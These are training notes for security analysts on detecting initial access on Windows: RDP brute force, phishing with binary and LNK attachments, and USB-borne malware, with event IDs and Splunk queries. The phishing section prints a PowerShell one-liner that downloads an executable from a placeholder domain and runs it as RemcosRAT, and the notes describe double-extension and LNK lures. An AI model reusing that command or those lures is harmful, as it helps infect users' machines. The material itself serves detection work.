# Initial Access

The moment an attacker first gets into a target. Whatever the final goal, this is step one.

## Analogy

- Network = a city of buildings, each with a front door
- Attackers pick one lock for weeks, smash doors with brute force, or try every door until one is open
- Initial Access = getting through the front door

## Two Groups

| Group | Needs | Example |
|---|---|---|
| Exposed services | A service reachable from the Internet | Weak RDP, unpatched web app (general knowledge) |
| Human interaction | A user to do something | Phishing, infected USB |

## Human-Driven Methods

Workstations are rarely Internet-exposed, so attackers rely on people. Windows is the most popular workstation OS, so expect these alerts often.

Common user mistakes:
- Clicking malicious links
- Launching phishing attachments
- Using pirated software
- Plugging in unknown USB devices

| MITRE technique | How it works |
|---|---|
| [T1566 Phishing](https://attack.mitre.org/techniques/T1566/) | Tricks the user into launching the malware themselves |
| [T1091 Removable Media](https://attack.mitre.org/techniques/T1091/) | Infected USB, hoping users plug it into multiple PCs |

## Usage by Threat Actors

- Popular methods shift over time
- Trend reports: [Mandiant M-Trends 2025](https://services.google.com/fh/files/misc/m-trends-2025-en.pdf)
- Attackers use every chance, not one favorite method
- Ransomware groups [Medusa](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a) and [Akira](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a) used all the described techniques at least once

## Detection Tips

- Human-driven access shows up as a user action first, then a process: check the parent of the suspicious process (Office app or browser launching `cmd.exe` or `powershell.exe`)
- Sysmon Event ID 1 and 11 catch the process launch and the file dropped
- USB cases: look for new processes launched from removable drive letters (general knowledge)
- A user saying "I never open untrusted files" doesn't rule it out; trust the logs

---

# Exposed RDP: Risks and Detection

An RDP port open to the Internet with a weak password gets breached within days, and the breach often ends in ransomware.

## Why It's Dangerous

- Example setup: IT admin exposes RDP on a production server for weekend access from home, with `Administrator:Summer2025`
- Censys Search shows 5,000,000+ RDP-enabled machines, many already under attacker control (figure from the source, check Censys for the current number)
- Defenders call RDP the **"Ransomware Deployment Protocol"** because an RDP breach so often leads straight to ransomware
- Botnets start brute-forcing within about an hour of exposure, producing hundreds of `4625` events

## Attack Timeline and Detection

Log file: `RDP-Security.evtx` (Security log)

| # | Attack step | Detection |
|---|---|---|
| 1 | **Network scan:** botnet finds the open RDP port | None in the logs; network attacks are out of scope here |
| 2 | **Brute force:** botnet tries common usernames (`Administrator`, `admin`, `support`) | See Step 2 below |
| 3 | **Initial access:** correct password guessed after ~100 attempts | See Step 3 below |
| 4 | **Further actions:** attacker logs in about 2 hours later and reviews the Desktop | See Step 4 below |

### Step 2: Detect the Brute Force

1. Open Security logs, filter Event ID `4625` (failed logins)
2. Filter Logon Type `3` and `10` (remote logons)
3. Filter for external IPs using the "Source IP" field
4. A match means a potential RDP brute force

### Step 3: Detect the Successful Breach

1. Keep the list from Step 2
2. Switch the filter to Event ID `4624` (successful logins)
3. Check which account the logon used
4. That is the account used for Initial Access

### Step 4: Trace What the Attacker Did

1. Keep the list from Step 3
2. Filter Logon Type `10` (interactive RDP login)
3. Copy the **Logon ID** from the logon event
4. Open Sysmon logs, search events with the same Logon ID
5. You now see every process the attacker started via RDP

## Red Flags Summary

- Many `4625` events from one external IP
- Common usernames being tried (`admin`, `support`)
- A `4624` from the same external IP after the failures
- A type 10 logon hours after the breach (attacker returning manually)

## Detection Tips

- Full chain: `4625` flood → `4624` success → type 10 logon → Sysmon Event ID 1 by Logon ID
- Same workflows as the 4624/4625 note, applied to a full incident
- The time gap (breach, then manual login 2 hours later) is typical: a botnet gets in, a human operator comes back later (general knowledge)
- Prevention (general knowledge, not in the lesson):
  - Don't expose RDP to the Internet; use a VPN or RD Gateway
  - Use strong, unique passwords and account lockout
  - Enable MFA
  - Keep NLA on
- Splunk starting point (field names may differ in your data):

        index=windowslogs EventID=4625 LogonType IN (3, 10) | stats count by IpAddress, TargetUserName | sort - count

---

# Phishing: Malicious Binaries and LNK Attachments

Phishing can't be blocked like RDP: if users have Internet access, they eventually bring malware in, bypassing the firewall entirely.

## Current State

- Phishing up **41x** since ChatGPT's 2022 release, per the [HoxHunt Phishing Trends Report 2025](https://hoxhunt.com/guide/phishing-trends-report)
- Success rates stay high, so users still fall for it
- Two techniques covered: malicious binaries and LNK attachments

## Technique 1: Binary Attachments

Windows has [many executable extensions](https://github.com/michalzobec/Security-Blocked-File-Extensions-Attachments/blob/main/list-of-blocked-file-extensions.txt). Users know `.exe` is risky but are less careful with these:

| Extension | Why it works |
|---|---|
| `.com` | Looks like a domain or meeting link (e.g. `tryhatme.com`) |
| `.scr` | Screensaver, rarely suspected |
| `.cpl` | Control Panel item, rarely suspected |

### Hidden Extensions

- Windows hides known file extensions by default, so `program.exe` shows as `program`
- Attackers abuse this ([MITRE T1036.007](https://attack.mitre.org/techniques/T1036/007/)) with double extensions:
  - `invoice.pdf.exe`
  - `cat.png.com`
- They also change the icon to match the topic, so it looks like a PDF or image

## Technique 2: LNK Attachments

- Attackers avoid AV by sending PowerShell, VBS, or BAT scripts instead of binaries
- To look trustworthy, the script hides behind an **LNK** shortcut (same type as Desktop shortcuts)
- Any command can go in the LNK "Target" field, and any icon can be set

### Example Scenario

1. Email from a "local PC store" announces discounts, with `Discounts.zip` attached
2. ZIP holds a PDF poster (harmless) and a shortcut named `Visit Our Website!.lnk`
3. The user trusts the PDF, then opens the shortcut
4. The shortcut runs a PowerShell command instead of opening a website

Verify by right-clicking the LNK → Properties → **Shortcut** tab → Target field.

### Payload Chain: LNK → PowerShell → RemcosRAT

    powershell.exe -c ...
    # Download the encoded malware
    (New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe');
    # Run the malware (RemcosRAT)
    start C:\\ProgramData\\r.exe;

| Step | Action |
|---|---|
| 1 | LNK launches `powershell.exe -c` |
| 2 | `WebClient.DownloadFile` fetches `r.exe` from a remote domain |
| 3 | Saved to `C:\ProgramData\r.exe` (staging directory) |
| 4 | `start` runs it: RemcosRAT |

- RemcosRAT is used in many attacks on major companies and government agencies

## Detection Tips

- Sysmon Event ID 1: look for `powershell.exe` launched by `explorer.exe` or an archive tool, with a long `-c` or encoded command line
- Sysmon Event ID 11: new `.exe` in `C:\ProgramData` or other staging paths
- Sysmon Event ID 3 / 22: the outbound connection and DNS lookup to the download domain
- Double extensions in filenames (`.pdf.exe`, `.png.com`) are an instant red flag; turn on "show file extensions" on analyst machines (general knowledge)
- Same chain as the earlier notes: process, then file drop, then network, linked by `ProcessId` and Logon ID
- Splunk starting point (field names may differ in your data):

        index=windowslogs EventID=1 Image="*\\powershell.exe" ParentImage="*\\explorer.exe" | table _time CommandLine ParentImage User

---

# Detecting Malicious Downloads (Sysmon)

If you know how the victim sees the attack, each stage of a phishing download leaves a Sysmon event you can hunt.

## Attack Flow

1. User opens a phishing attachment in a browser or desktop app
2. Simplest case: a direct `.exe` download
3. More likely: an archive (`.zip`, `.rar`) containing the malware

## Sysmon Chain: Double-Extension Attachment

| Step | Event ID | What happens | Key fields |
|---|---|---|---|
| 1 | 1 | Browser launched | `Image: ...\msedge.exe`, `ParentImage: ...\Explorer.EXE` |
| 2 | 11 | Archive appears in Downloads | `Image: msedge.exe`, `TargetFilename: ...\Downloads\invoice.zip*` |
| 3 | 11 | (Optional) user extracts files | `Image: Explorer.EXE` or `7zG.exe`, `TargetFilename: ...\invoice.pdf.exe` |
| 4 | 1 | User double-clicks the extracted file | `Image: ...\Downloads\invoice.pdf.exe`, `ParentImage: Explorer.EXE` |

- Step 3 is optional because Windows can open files straight from inside a ZIP
- The `*` after `invoice.zip` is a wildcard in the source; browsers also create temporary download files (general knowledge)
- Final tell: an `.exe` running from `Downloads` with a double extension, launched by Explorer

## LNK Attachments

LNK files leave very little execution trace.

- User runs a fake "Chrome" shortcut that actually runs a PowerShell payload
- Explorer reads the LNK "Target" field and starts the payload
- In the logs it looks like `explorer.exe` launched `powershell.exe` directly
- The LNK itself never shows up as a process

### How to Confirm LNK Phishing

- Look for the preceding Event ID 11: a `.lnk` file created in `Downloads`
- LNK files must have landed somewhere first, usually through the browser or an archive tool
- A `.lnk` in `Downloads` + `explorer.exe` → `powershell.exe` = likely LNK phishing

## Binary vs LNK

| | Binary attachment | LNK attachment |
|---|---|---|
| Process in Event ID 1 | The malware itself | `powershell.exe` or similar, parent `explorer.exe` |
| Execution trace | Clear: malicious file is the `Image` | Minimal: LNK never appears as a process |
| Where to pivot | The `Image` path and name | The earlier `.lnk` file-create event (Event 11) |

## Detection Tips

- Work backwards from the malicious process: Event 1 → find the Event 11 that created the file → find which process created it
- Red flags for the file-create event:
  - Created by a browser or archive tool
  - In `Downloads`, `Temp`, or `ProgramData`
  - Double extension, or `.lnk`/`.scr`/`.com`
- Same method as the phishing note: process, file drop, then network, linked by `ProcessId` and Logon ID
- General knowledge, not in the lesson: Windows marks downloaded files with a Mark of the Web stream (`Zone.Identifier`), which Sysmon Event ID 15 can log
- Splunk starting points (field names may differ in your data):

        index=windowslogs EventID=11 TargetFilename IN ("*\\Downloads\\*.lnk", "*.pdf.exe", "*.png.com") | table _time Image TargetFilename

        index=windowslogs EventID=1 ParentImage="*\\explorer.exe" Image="*\\Downloads\\*" | table _time Image CommandLine User

---

# Initial Access via Removable Media (USB)

Infected USB drives still work: they bypass firewalls like phishing does, can start an attack with no Internet access, and can keep spreading without user interaction.

## Real-World Proof

- [Camaro Dragon](https://research.checkpoint.com/2023/beyond-the-horizon-traveling-the-world-on-camaro-dragons-usb-flash-drives/): infected USB flash drives used for attacks
- [Raspberry Robin](https://redcanary.com/blog/threat-intelligence/raspberry-robin/): USB-spread malware
- MITRE technique: T1091 Removable Media (from the Initial Access note)

## Delivery Scenarios

### 1. USB Delivery Case

- Employee receives a package with a hat and a USB labelled "A gift from HR"
- Plugs it in, a harmless GIF opens, and they thank HR
- The malware has already spread to the laptop
- [Real-world case](https://hackread.com/fbi-hackers-mail-malicious-usb-drives-ransomware/)

### 2. Print Service Case

- User hands a USB to a third party (a print shop) to print a document
- The shop's system already has a worm, which copies itself onto the USB
- The user brings the USB home and the infection continues on their PC
- [Real-world story](https://www.malwarebytes.com/blog/news/2025/05/malware-infected-printer-delivered-something-extra-to-windows-users)

## How the User Gets Infected

Advanced auto-run tricks exist, but most cases are the user launching the malware themselves. Common tricks:

| Trick | What the user sees |
|---|---|
| Hides all real files and creates `RECOVERY.lnk` | A shortcut that looks like the way to the files |
| Creates `Photos.exe` with a folder icon | A normal-looking folder |
| Creates double-extension copies of every file (`photo_2024_1_12.jpg.exe`) | The same photos, with the real extension hidden |

## Detection

- Looks very similar to phishing attachment detection
- Both rely on the user launching a malicious binary through the GUI (`explorer.exe`), so it's hard to tell how the attack started
- Best evidence: execution from an external drive, e.g. `E:\malware.exe`

| Phishing | USB |
|---|---|
| Process runs from `Downloads` | Process runs from a drive letter like `E:\` |
| File-create event by browser or archive tool | No download: the file was already on the drive |
| Parent `explorer.exe` | Parent `explorer.exe` |

## Detection Tips

- Sysmon Event ID 1: `Image` path starting with a drive letter other than `C:` (the removable drive)
- Sysmon Event ID 1: `ParentImage` is `explorer.exe`
- Look for `.lnk` launching `cmd.exe` or `powershell.exe` from the external drive
- Double extensions (`.jpg.exe`) and folder-icon executables are red flags
- General knowledge, not in the lesson: Event ID 6416 (Security) logs new external devices, but it must be enabled first
- Same chain logic as the phishing notes: launch, then file drops, then network, linked by `ProcessId` and Logon ID
- Splunk starting point (field names may differ in your data):

        index=windowslogs EventID=1 NOT Image="C:\\*" | table _time Image CommandLine ParentImage User
